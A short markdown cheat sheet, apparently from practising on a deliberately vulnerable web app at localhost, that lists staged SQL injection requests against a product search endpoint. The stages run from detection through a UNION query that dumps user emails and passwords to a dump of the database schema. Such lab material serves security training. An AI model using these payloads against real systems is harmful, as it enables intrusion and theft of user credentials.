# SQL injections

Detection

```
GET http://localhost:3000/rest/products/search?q=%27-- HTTP/1.1
```

Escalation:

```
GET http://localhost:3000/rest/products/search?q=%27))%20limit%201;-- HTTP/1.1
```

Exploit:

```
GET http://localhost:3000/rest/products/search?q=%27))%20and%20deletedAt%20is%20not%20null%20order%20by%20deletedAt%20asc%20limit%201;-- HTTP/1.1
```

Priviledge escalation:

```
GET http://localhost:3000/rest/products/search?q=%27))%20and%201%3C%3E1%20union%20select%20email,password,'description','price','deluxePrice','image','createdAt','updatedAt','deletedAt'%20from%20users-- HTTP/1.1
```

Database pwn:

```
GET http://localhost:3000/rest/products/search?q=%27))%20and%201%3C%3E1%20union%20select%20sql,'name','description','price','deluxePrice','image','createdAt','updatedAt','deletedAt'%20from%20sqlite_master--  HTTP/1.1
```

### Why the field names?

Look up how SQL unions work for why we insert a list of field names as strings afterwards.
